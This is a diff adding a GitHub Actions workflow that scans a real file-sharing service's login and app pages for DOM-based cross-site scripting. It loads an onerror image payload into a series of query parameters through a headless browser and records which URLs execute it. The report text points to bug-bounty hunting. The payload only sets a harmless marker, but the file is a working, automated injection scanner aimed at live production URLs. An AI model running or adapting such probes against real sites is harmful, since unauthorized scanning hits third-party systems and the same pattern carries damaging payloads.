@@ -1,0 +1,66 @@
+name: Files.com Browser Injection Probe
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - ".github/workflows/files-browser-xss.yml"
+
+permissions:
+  contents: read
+
+jobs:
+  xss:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install browser
+        run: |
+          npm install -g agent-browser
+          agent-browser install
+      - name: Test public app for DOM injection
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p browser-evidence
+          payload='<img src=x onerror="document.documentElement.setAttribute('''data-h1xss''','''1''')">'
+          enc=$(python -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$payload")
+          findings=0
+          : > browser-evidence/results.txt
+          for base in "https://app.files.com/" "https://app.files.com/login" "https://app.files.com/login_from_oauth"; do
+            for key in q query search next redirect redirect_to return_to continue url; do
+              url="${base}?\${key}=${enc}"
+              agent-browser close >/dev/null 2>&1 || true
+              agent-browser open "$url" >/dev/null
+              agent-browser wait 3000 >/dev/null 2>&1 || true
+              marker=$(agent-browser eval "document.documentElement.getAttribute('data-h1xss')" 2>/dev/null || true)
+              title=$(agent-browser get title 2>/dev/null || true)
+              current=$(agent-browser get url 2>/dev/null || true)
+              printf '%s\t%s\t%s\t%s\n' "$url" "$marker" "$title" "$current" | tee -a browser-evidence/results.txt
+              if [[ "$marker" == "1" ]]; then
+                findings=$((findings+1))
+                printf 'FINDING\t%s\n' "$url" | tee -a browser-evidence/results.txt
+              fi
+            done
+          done
+          agent-browser close >/dev/null 2>&1 || true
+
+          if [[ "$findings" -gt 0 ]]; then
+            cat > browser-evidence/report.md <<'EOF'
+          # Potential DOM XSS candidate
+          
+          A browser-executed test payload set a controlled DOM marker on an in-scope Files.com page. The exact URL is recorded in results.txt. Manual reproduction and current program-policy/duplicate validation are required before any submission.
+          EOF
+          else
+            cat > browser-evidence/report.md <<'EOF'
+          # NO VERIFIED BROWSER INJECTION FINDING
+          
+          The tested query-parameter variants did not execute the controlled browser marker.
+          EOF
+          fi
+      - name: Upload browser evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: files-browser-xss-evidence
+          path: browser-evidence
